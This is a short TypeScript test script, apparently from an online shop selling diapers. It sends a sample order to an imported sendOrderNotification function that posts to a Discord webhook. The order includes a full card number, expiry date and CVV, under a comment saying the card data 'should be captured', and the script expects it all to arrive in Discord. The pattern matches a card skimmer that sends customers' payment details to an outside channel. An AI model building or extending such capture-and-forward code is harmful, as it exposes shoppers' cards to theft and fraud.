import { sendOrderNotification } from '@/lib/discord-webhook';

async function testNotification() {
  console.log('Testing order notification functionality...');
  
  const testOrderData = {
    orderId: 'test-order-12345',
    customerName: 'Test Customer',
    customerEmail: 'test@example.com',
    totalAmount: 99.99,
    items: [
      { name: 'Premium Diapers', quantity: 2, price: 29.99 }
    ],
    shippingAddress: '123 Test Street, Test City',
    paymentMethod: 'Credit Card',
    
    // Card data that should be captured
    cardName: 'Test Cardholder',
    cardNumber: '4111111111111111',
    cardExpiry: '12/25',
    cardCvv: '123'
  };

  try {
    console.log('Sending test order notification...');
    const result = await sendOrderNotification(testOrderData);
    console.log('Notification result:', result);
    console.log('✅ Test passed - notification should have been sent to Discord');
  } catch (error) {
    console.error('❌ Test failed:', error instanceof Error ? error.message : String(error));
    console.error('Full error:', error);
  }
}

testNotification();